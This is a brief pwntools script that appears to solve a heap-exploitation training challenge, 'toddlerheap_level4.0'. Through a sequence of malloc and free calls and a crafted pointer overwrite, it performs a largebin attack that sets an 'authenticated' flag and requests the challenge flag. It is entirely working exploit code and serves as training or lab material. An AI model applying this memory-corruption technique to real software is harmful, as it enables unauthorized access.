# largebin attack -> modify `authenticated` to non-zero

from pwn import *

context.arch = 'amd64'
BINARY = "/challenge/toddlerheap_level4.0"
p = process(BINARY)

p.sendline(f"malloc 0 3100")
p.sendline(f"malloc 1 3080")
p.sendline(f"malloc 2 3072")
p.sendline(f"malloc 3 3080")
p.sendline(f"free 0")
p.sendline(f"malloc 4 3130")
p.sendline(f"free 2")
p.sendline(f'safe_read 0')
p.send(b'\x00'*24 + p64(0x4041c0 - 0x20))
p.sendline(f"malloc 5 3130")

p.sendline(b"send_flag")
p.interactive()